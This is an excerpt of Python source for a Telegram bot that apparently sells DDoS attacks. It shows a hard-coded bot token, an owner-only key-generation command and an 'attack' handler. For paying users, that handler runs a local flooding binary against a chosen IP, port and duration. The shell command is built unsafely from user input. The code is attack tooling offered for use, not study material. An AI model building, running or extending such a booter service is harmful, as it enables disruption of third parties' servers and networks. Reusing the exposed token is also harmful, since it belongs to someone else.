...
# Configuration
TOKEN = '7509113069:AAEomwzwLl6rsN-YfI8b-dN0jRRSsHf7hZs'
...
def handle_genkey(message):
    if message.from_user.id != ADMIN_USER_ID:
        bot.reply_to(message, "𝙊𝙉𝙇𝙔 𝙊𝙒𝙉𝙀𝙍 𝘿𝙈-> @RAJPUTDDOS")
        return
...
async def run_attack(target_ip, target_port, duration):
    ...
    try:
        process = await asyncio.create_subprocess_shell(f"./rajput {target_ip} {target_port} {duration} 900")
...
def handle_attack(message):
    ...
    if not user_data or user_data['plan'] == 0:
        bot.reply_to(message, "𝘿𝙈-> @RAJPUTDDOS")
        return
